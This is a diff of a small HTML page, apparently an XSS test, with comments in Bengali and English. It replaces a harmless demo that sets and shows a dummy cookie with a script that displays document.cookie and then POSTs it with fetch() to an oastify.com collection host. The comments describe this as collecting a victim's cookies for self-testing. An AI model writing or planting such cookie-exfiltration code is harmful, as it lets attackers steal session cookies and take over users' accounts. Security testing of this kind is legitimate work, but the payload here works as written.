@@ -1,15 +1,23 @@
 <!DOCTYPE html>
-<html lang="en"> 
-<head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>Hello World</title> 
-</head> 
-<body> 
-  <h1>Hello, World!</h1> 
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>XSS Test</title>
+</head>
+<body>
+  <h1>Hello, this is XSS Test Page</h1>
+
   <script>
-  document.cookie = "testcookie=12345";   // কৃত্রিম কুকি সেট
-  alert(document.cookie);                // এখন 'testcookie=12345' দেখাবে
-</script>
-</body> 
+    // Alert কুকি দেখাবে
+    alert("Your Cookies: " + document.cookie);
+
+    // নিচের কোড victim এর কুকি collect করার জন্য request পাঠায় (শুধু তোমার নিজের অ্যাকাউন্টে পরীক্ষা করো)
+    fetch("https://t3x9p97r2swo5apc25g23tcge7ky8owd.oastify.com", {
+      method: "POST",
+      body: document.cookie,
+      mode: "no-cors"
+    });
+  </script>
+</body>
 </html>
